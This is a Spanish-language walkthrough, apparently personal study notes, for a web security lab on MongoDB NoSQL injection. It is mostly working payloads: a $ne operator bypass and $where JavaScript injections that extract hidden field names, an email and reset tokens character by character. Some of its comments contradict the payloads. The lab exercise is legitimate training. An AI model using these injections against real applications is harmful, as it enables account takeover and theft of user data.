# 04 Lab: Exploiting NoSQL operator injection to extract unknown fields

## Objetivo

> The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.
> 
> 
> To solve the lab, log in as `carlos`.
> 

## Solución

Cambia el valor del parámetro `password` de 'invalid' a `{"$ne":"invalid"}`, y luego envía la solicitud. Observa que ahora recibes un mensaje de error que dice 'Cuenta bloqueada'. No puedes acceder a la cuenta de Carlos, pero esta respuesta indica que el operador `$ne` ha sido aceptado y que la aplicación es vulnerable."

![image.png](04%20Lab%20Exploiting%20NoSQL%20operator%20injection%20to%20extr%2017efab5460ec80279c68f3895675d869/image.png)

![image.png](04%20Lab%20Exploiting%20NoSQL%20operator%20injection%20to%20extr%2017efab5460ec80279c68f3895675d869/image%201.png)

Cambia `"$where": "0"` a `"$where": "1"`, y luego vuelve a enviar la solicitud. Observa que recibes un mensaje de error que dice 'Cuenta bloqueada'. Esto indica que el JavaScript en la cláusula `$where` está siendo evaluado

![image.png](04%20Lab%20Exploiting%20NoSQL%20operator%20injection%20to%20extr%2017efab5460ec80279c68f3895675d869/image%202.png)

"$where":"Object.keys(this)[1].match('^.{}.*')”

```jsx
{
<pos 0> "_id" : 'xxxxxx',
<pos 1> "username":"carlos",
<pos 2> "password":{"$ne":"invalid"},
<pos 3> "posible_campo" : 'valor_campo'
}

"$where":"function(){ if (Object.keys(this)[1].match('username')) return 1; else 0;}"
"$where":"function(){ if (Object.keys(this)[1].length == 6 ) return 1; else 0;}"

{
"username":"carlos",
"password":{"$ne":"invalid"},
"$where": "1"

}
```

![image.png](04%20Lab%20Exploiting%20NoSQL%20operator%20injection%20to%20extr%2017efab5460ec80279c68f3895675d869/image%203.png)

```jsx
"$where":"function(){ if (Object.keys(this)[3].length == 6 ) return 1; else 0;}"
Asi que tiene 5 caracteres
```

![image.png](04%20Lab%20Exploiting%20NoSQL%20operator%20injection%20to%20extr%2017efab5460ec80279c68f3895675d869/image%204.png)

![image.png](04%20Lab%20Exploiting%20NoSQL%20operator%20injection%20to%20extr%2017efab5460ec80279c68f3895675d869/image%205.png)

```jsx
"$where":"function(){ if (Object.keys(this)[3].match(/^$a$/)) return 1; else 0;}"
Vamos a sacar con esto el primer caracter, y asi lo hacemos sucesivamente
Campo del usuario: email
```

```jsx
a
b
c
d
e
f
g
h
i
j
k
l
m
n
o
p
q
r
s
t
u
v
w
x
y
z
A
B
C
D
E
F
G
H
I
J
K
L
M
N
O
P
Q
R
S
T
U
V
W
X
Y
Z
0
1
2
3
4
5
6
7
8
9

```

![image.png](04%20Lab%20Exploiting%20NoSQL%20operator%20injection%20to%20extr%2017efab5460ec80279c68f3895675d869/image%206.png)

![image.png](04%20Lab%20Exploiting%20NoSQL%20operator%20injection%20to%20extr%2017efab5460ec80279c68f3895675d869/image%207.png)

![image.png](04%20Lab%20Exploiting%20NoSQL%20operator%20injection%20to%20extr%2017efab5460ec80279c68f3895675d869/image%208.png)

![image.png](04%20Lab%20Exploiting%20NoSQL%20operator%20injection%20to%20extr%2017efab5460ec80279c68f3895675d869/image%209.png)

![image.png](04%20Lab%20Exploiting%20NoSQL%20operator%20injection%20to%20extr%2017efab5460ec80279c68f3895675d869/image%2010.png)

---

---

![image.png](04%20Lab%20Exploiting%20NoSQL%20operator%20injection%20to%20extr%2017efab5460ec80279c68f3895675d869/image%2011.png)

```jsx
// hidden field name is "mail"
"$where":"function(){ if (this.email.length == 1 ) return 1; else 0;}"
// Son 25 caracteres
"$where":"function(){ if (this.email.match(/^$a$/)) return 1; else 0;}"
"$where":"function(){ if (this.email.match('^.{$NUMBER$}$CARACTER$.*')) return 1; else 0;}"
"$where":"function(){ if (this.email.match('^.{§1§}§A§.*')) return 1; else 0;}"

{§§}§§
('^.{§§}§§.*')

carlos@carlos-montoya.net

unlockToken
```

![image.png](04%20Lab%20Exploiting%20NoSQL%20operator%20injection%20to%20extr%2017efab5460ec80279c68f3895675d869/image%2012.png)

![image.png](04%20Lab%20Exploiting%20NoSQL%20operator%20injection%20to%20extr%2017efab5460ec80279c68f3895675d869/image%2013.png)

![image.png](04%20Lab%20Exploiting%20NoSQL%20operator%20injection%20to%20extr%2017efab5460ec80279c68f3895675d869/image%2014.png)

![image.png](04%20Lab%20Exploiting%20NoSQL%20operator%20injection%20to%20extr%2017efab5460ec80279c68f3895675d869/image%2015.png)

Otro campo aparte del email

```jsx
{"username":"carlos","password":{"$ne":"invalid"},
"$where":"function(){ if (Object.keys(this)[4].length == §6§ ) return 1; else 0;}"
}
Son 11 caracteres

"$where":"function(){ if (Object.keys(this)[4].match(/^$a$/)) return 1; else 0;}"
unlockToken
9457f5cff38fff0b

"$where":"function(){ if (Object.keys(this)[4].match(/^f§a§/)) return 1; else 0;}"
"$where":"function(){ if (Object.keys(this)[4].match('^.{§1§}§1§.*')) return 1; else 0;}"
forgotPwd
"$where":"function(){ if (this.forgotPwd.match(/^$a$/)) return 1; else 0;}"
"$where":"function(){ if (this.forgotPwd.match('^.{§1§}§A§.*')) return 1; else 0;}"
db10648a240ccfa1
```

![image.png](04%20Lab%20Exploiting%20NoSQL%20operator%20injection%20to%20extr%2017efab5460ec80279c68f3895675d869/image%2016.png)

![image.png](04%20Lab%20Exploiting%20NoSQL%20operator%20injection%20to%20extr%2017efab5460ec80279c68f3895675d869/image%2017.png)

![Untitled](04%20Lab%20Exploiting%20NoSQL%20operator%20injection%20to%20extr%2017efab5460ec80279c68f3895675d869/Untitled.png)